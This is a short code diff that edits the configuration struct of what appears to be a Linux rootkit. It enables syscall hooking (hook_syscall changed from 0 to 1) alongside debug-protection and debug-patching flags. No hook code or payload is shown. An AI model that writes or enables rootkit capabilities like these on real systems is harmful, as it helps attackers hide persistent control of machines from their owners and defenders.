@@ -14,7 +14,7 @@ struct rootkit_config rk_cfg = {
 	.state = RK_BOOT,
 	.dr_protect = 1,
 	.patch_debug = 1,
-	.hook_syscall = 0,
+	.hook_syscall = 1,
 	.hook_vfs = 0,
 };
 
